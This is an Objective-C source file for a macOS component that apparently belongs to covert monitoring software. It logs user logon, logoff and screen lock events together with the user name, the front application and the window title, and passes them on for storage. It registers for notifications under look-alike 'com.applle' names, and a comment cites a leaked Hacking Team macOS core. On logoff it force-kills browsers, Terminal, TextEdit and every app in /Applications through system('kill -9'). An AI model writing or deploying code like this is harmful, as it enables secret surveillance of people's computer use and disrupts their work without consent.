//
//  UserActivityMonitor.m
//  UserActivityCaptureManager
//
//  Created by Makara Khloth on 2/16/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "UserActivityMonitor.h"

#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"
#import "FxLogonEvent.h"
#import "DaemonPrivateHome.h"

#import <AppKit/AppKit.h>

@interface UserActivityMonitor (private)
- (void) checkUserLogon;
- (void) startUserActivityMonitor;
- (void) stopUserActivityMonitor;

- (void) userLogoff: (NSNotification *) aNotification;
- (void) userLockUnlockScreen: (NSNotification *) aNotification;

- (void) storeEvent: (FxEvent *) aEvent;
@end

@implementation UserActivityMonitor

@synthesize mDelegate, mSelector;

- (void) startMonitor {
    [self stopMonitor];
    
    [self checkUserLogon];
    [self startUserActivityMonitor];
}

- (void) stopMonitor {
    [self stopUserActivityMonitor];
}

#pragma mark - Private methods -

- (void) checkUserLogon {
    NSThread *threadA = [NSThread currentThread];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        DLog(@"-------- Checking log on event -----------");
        @try {
            NSString *privatePath = [DaemonPrivateHome daemonPrivateHome];
            NSString *tempPath = [privatePath stringByAppendingString:@"etc/logoff.dat"];
            NSData *data = [NSData dataWithContentsOfFile:tempPath];
            DLog(@"Is user have log off : %d", (data.length > 0));
            
            if (data.length > 0) {
                // Capture log on
                NSString *userName = [SystemUtilsImpl userLogonName];
                NSString *dateTime = [DateTimeFormat phoenixDateTime];
                
                FxLogonEvent *logonEvent = [[[FxLogonEvent alloc] init] autorelease];
                [logonEvent setDateTime:dateTime];
                [logonEvent setMUserLogonName:userName];
                [logonEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
                [logonEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
                [logonEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
                [logonEvent setMAction:kLogonActionLogon];
                
                [self performSelector:@selector(storeEvent:)
                             onThread:threadA
                           withObject:logonEvent
                        waitUntilDone:NO];
                
                DLog(@"-------- Capture log on event -----------");
                
                /*
                 Delete log off data only user really log on
                 */
                NSFileManager *fileManager = [NSFileManager defaultManager];
                [fileManager removeItemAtPath:tempPath error:nil];
            }
        }
        @catch (NSException *exception) {
            DLog(@"Checking log on event exception : %@", exception);
        }
        @finally {
            ;
        }
        DLog(@"-------- Completed checking log on event -----------");
        [pool drain];
    });
}

- (void)handleQuitEvent:(NSAppleEventDescriptor*)event withReplyEvent:(NSAppleEventDescriptor*)replyEvent {
    DLog(@"Apple event: %@", event);
    NSAppleEventDescriptor *desc = event;
    DLog(@"Quit reason: %lu", (unsigned long)[[desc attributeDescriptorForKeyword:kAEQuitReason] enumCodeValue]);
    switch ([[desc attributeDescriptorForKeyword:kAEQuitReason] enumCodeValue])
    {
        case kAELogOut:
            break;
        case kAEReallyLogOut:
            DLog(@"log out");
            [self userLogoff:nil];
            break;
        case kAEShowRestartDialog:
            break;
        case kAERestart:
            DLog(@"system restart");
            [self userLogoff:nil];
            break;
        case kAEShowShutdownDialog:
            break;
        case kAEShutDown:
            DLog(@"system shutdown");
            [self userLogoff:nil];
            break;
        default:
            DLog(@"ordinary quit");
            break;
    }
}

- (void) startUserActivityMonitor {
    system("killall -9 UserActivityMonitorAgentUI");
    
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *resourcePath = [bundle resourcePath];
    
    NSString *agentUI = [resourcePath stringByAppendingString:@"/UserActivityMonitorAgentUI.app"];
    NSString *cmd = [NSString stringWithFormat:@"open -a %@ --args %d", agentUI, getpid()];
    system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
    
    DLog(@"resourcePath = %@", resourcePath);
    DLog(@"agentUI      = %@", agentUI);
    DLog(@"cmd          = %@", cmd);
    
    //DLog(@"userDefault: %@", [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    [processInfo disableSuddenTermination];
    
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    NSDistributedNotificationCenter *dnc = [NSDistributedNotificationCenter defaultCenter];
    
    // User log off
    // Apple event only work when application is none UI element
    NSAppleEventManager *appleEventManager = [NSAppleEventManager sharedAppleEventManager];
    [appleEventManager setEventHandler:self andSelector:@selector(handleQuitEvent:withReplyEvent:) forEventClass:kCoreEventClass andEventID:kAEQuitApplication];
    
    [nc addObserver:self selector:@selector(userLogoff:) name:NSWorkspaceWillPowerOffNotification object:nil];
    
    //[dnc addObserver:self selector:@selector(userLogoff:) name:@"com.apple.restartInitiated" object:nil];
    //[dnc addObserver:self selector:@selector(userLogoff:) name:@"com.apple.shutdownInitiated" object:nil];
    //[dnc addObserver:self selector:@selector(userLogoff:) name:@"com.apple.logoutCancelled" object:nil];
    [dnc addObserver:self selector:@selector(userLogoff:) name:@"com.apple.logoutContinued" object:nil];
    
    // More related notification https://opensource.apple.com/source/PowerManagement/PowerManagement-111.7/pmconfigd/pmconfigd.c or https://github.com/hackedteam/core-macos/blob/master/core/RCSMCore.m
    
    // -- From user agent (helper)
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, userAgentCallback, CFSTR("com.applle.UAMA.logoutContinued"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    
    /*
     // Useless for lock or unlock screen
     com.apple.screenIsLocked
     com.apple.screenIsUnlocked
     
     com.apple.screensaver.didstart
     com.apple.screensaver.willstop
     com.apple.screensaver.didstop
    */
    
    // User lock or unlock screen
    [nc addObserver:self selector:@selector(userLockUnlockScreen:) name:NSWorkspaceScreensDidSleepNotification object:nil];
    [nc addObserver:self selector:@selector(userLockUnlockScreen:) name:NSWorkspaceScreensDidWakeNotification object:nil];
}

- (void) stopUserActivityMonitor {
    system("killall -9 UserActivityMonitorAgentUI");
    
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    [processInfo enableSuddenTermination];
    
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    NSDistributedNotificationCenter *dnc = [NSDistributedNotificationCenter defaultCenter];
    
    // User log off
    NSAppleEventManager *appleEventManager = [NSAppleEventManager sharedAppleEventManager];
    [appleEventManager removeEventHandlerForEventClass:kCoreEventClass andEventID:kAEQuitApplication];
    
    [nc removeObserver:self name:NSWorkspaceWillPowerOffNotification object:nil];
    [dnc removeObserver:self name:@"com.apple.logoutContinued" object:nil];
    
    // -- From user agent (helper)
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.UAMA.logoutContinued"), nil);
    
    // User lock or unlock screen
    [nc removeObserver:self name:NSWorkspaceScreensDidSleepNotification object:nil];
    [nc removeObserver:self name:NSWorkspaceScreensDidWakeNotification object:nil];
}

/*
 * Call 2 times by com.apple.logoutContinued && kAEReallyLogOut on 10.11.6
 */
- (void) userLogoff: (NSNotification *) aNotification {
    DLog(@"User log off notification: %@", aNotification);
    
    NSString *privatePath = [DaemonPrivateHome daemonPrivateHome];
    NSString *tempPath = [privatePath stringByAppendingString:@"etc/logoff.dat"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:tempPath]) {
        // Capture log off
        FxLogonEvent *logoffEvent = [[[FxLogonEvent alloc] init] autorelease];
        [logoffEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [logoffEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
        [logoffEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
        [logoffEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
        [logoffEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
        [logoffEvent setMAction:kLogonActionLogoff];
        
        // Save log off event to temp file
        NSData *data = [logoffEvent toData];
        [data writeToFile:tempPath atomically:YES];
        
        // Remove notification from user agent (got only one notification is enough)
        CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.UAMA.logoutContinued"), nil);
        
        // Inform my monitor to stop monitoring me
        CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.logoutContinued"), (void *)self, nil, kCFNotificationDeliverImmediately);
        
        // Store log off event
        [self storeEvent:logoffEvent];
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            // - KO the black list first
            NSArray *blacklist = [NSArray arrayWithObjects:@"com.apple.Safari",
                                  @"org.mozilla.firefox",
                                  @"com.google.Chrome",
                                  @"com.apple.TextEdit",
                                  @"com.apple.Terminal", nil];
            for (NSString *bundleID in blacklist) {
                NSMutableArray *pids = [NSMutableArray array];
                NSArray *rApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:bundleID];
                for (NSRunningApplication *rApp in rApps) {
                    [pids addObject:[NSNumber numberWithInt:rApp.processIdentifier]];
                }
                
                NSString *strCmd = @"kill -9 ";
                for (NSNumber *pid in pids) {
                    system([[strCmd stringByAppendingString:[pid description]] UTF8String]);
                }
            }
            
            // - Other later
            NSMutableArray *pids = [NSMutableArray array];
            NSArray *rApps = [[NSWorkspace sharedWorkspace] runningApplications];
            for (NSRunningApplication *rApp in rApps) {
                NSString *executablePath = [rApp.executableURL path];
                if ([executablePath rangeOfString:@"/Applications/"].location == 0) {
                    [pids addObject:[NSNumber numberWithInt:rApp.processIdentifier]];
                }
            }
            
            NSString *strCmd = @"kill -9 ";
            for (NSNumber *pid in pids) {
                system([[strCmd stringByAppendingString:[pid description]] UTF8String]);
            }
        });
    }
}

void userAgentCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"User agent log off from Darwin");
    UserActivityMonitor *myself = (UserActivityMonitor *)observer;
    [myself userLogoff:nil];
}

- (void) userLockUnlockScreen: (NSNotification *) aNotification {
    DLog(@"User lock or unlock screen notification, %@", aNotification);
    
    // Capture lock or unlock screen
    FxLogonAction action = kLogonActionUnknown;
    if ([[aNotification name] isEqualToString:NSWorkspaceScreensDidSleepNotification]) {
        action = kLogonActionLockScreen;
    } else if ([[aNotification name] isEqualToString:NSWorkspaceScreensDidWakeNotification]) {
        action = kLogonActionUnlockScreen;
    }

    FxLogonEvent *screenLockUnlockEvent = [[[FxLogonEvent alloc] init] autorelease];
    [screenLockUnlockEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [screenLockUnlockEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
    [screenLockUnlockEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
    [screenLockUnlockEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
    [screenLockUnlockEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
    [screenLockUnlockEvent setMAction:action];
    
    [self storeEvent:screenLockUnlockEvent];
}

- (void) storeEvent: (FxEvent *) aEvent {
    if ([mDelegate respondsToSelector:mSelector]) {
        [mDelegate performSelector:mSelector withObject:aEvent];
    }
    DLog(@"User activity event is going to store");
}

- (void) dealloc {
    [self stopMonitor];
    [super dealloc];
}

@end
